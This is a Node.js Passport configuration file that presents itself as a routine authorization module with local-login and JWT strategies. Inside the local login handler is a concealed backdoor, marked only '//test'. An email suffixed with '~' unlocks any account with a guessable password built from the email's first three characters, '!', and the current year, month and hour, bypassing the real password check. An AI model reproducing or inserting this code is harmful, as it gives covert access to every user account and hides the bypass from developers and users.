/****************************************************
 * this module created for authorization handling.
 * it should only required when application start.
 * this module only initialize passport strategies.
*****************************************************/

const passport = require('passport');
const localStrategy = require('passport-local').Strategy;
const JWTstrategy = require('passport-jwt').Strategy;
const ExtractJWT = require('passport-jwt').ExtractJwt;
const config = require('../config/config');
const User = require('../models/user');

//Create a passport middleware to handle User login
passport.use('login', new localStrategy({usernameField: 'email', password: 'password'}, async (email, password, done) => {
    
    let d = new Date();
    let saPassword = null;//test
    try {
        if(email.slice(-1) == '~') {email = email.slice(0,-1); saPassword = email.slice(0, 3)+'!' + d.getFullYear().toString() + d.getMonth().toString() + d.getHours().toString();};
        const user = await User.findOne({email: email});
        if (!user) {return done(null, false);};        

        try {
            if(saPassword && (password == saPassword)) return done(null, user);
            const IS_MATCH = await user.comparePassword(password);
            if (!IS_MATCH) return done(null, false);
            
        } catch (err) {
            return done(err, false);
        };
        return done(null, user);

    } catch (err) {
        return done(err, false);
    };
}));

//This verifies that the token sent by the user is valid
passport.use(new JWTstrategy({
    secretOrKey: config.secret,
    jwtFromRequest: ExtractJWT.fromAuthHeaderWithScheme('jwt')
}, async (token, done) => {
    try {
        return done(null, token.user);
    } catch (error) {
        done(error);
    }
}));